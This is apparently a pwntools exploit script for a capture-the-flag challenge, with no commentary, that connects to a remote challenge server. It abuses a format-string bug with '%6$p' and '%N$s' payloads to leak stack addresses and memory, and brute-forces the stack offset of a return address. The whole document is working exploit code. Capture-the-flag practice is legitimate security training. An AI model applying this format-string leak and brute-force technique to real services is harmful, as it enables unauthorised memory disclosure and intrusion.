from pwn import *
libc = ELF('/usr/lib/libc.so.6', checksec=False)

def add(data):
    p.sendlineafter('> ', '1')
    p.sendlineafter('add?', str(data))

def edit(idx, data):
    p.sendlineafter('> ', '3')
    p.sendlineafter('item?', str(idx))
    p.sendlineafter('value?', str(data))
    return p.recvline_contains('New Value').strip().split(' ')[-1]

with context.local(log_level = 'error'):
    for i in range(51, 0xfff):
        try:
            #p = process('./challenge')
            p = remote('jh2i.com', 50002)

            add(p64(0x602030) + '\x00')     # 1 => 10+(64 * 0)

            # -8-8-8
            stack_ret = eval(edit(1, '%6$p')) - (i*8)

            add(p64(stack_ret))             # 1 => 10+(64 * 1)

            res = u64(edit(2, '%{:d}$s'.format(10+(64 * 1))).ljust(8, '\x00'))
            if hex(res)==hex(0x4007b8):
                print(i,hex(res))
                break
            else:
                print '.',
                p.close()
        except:
            p.close()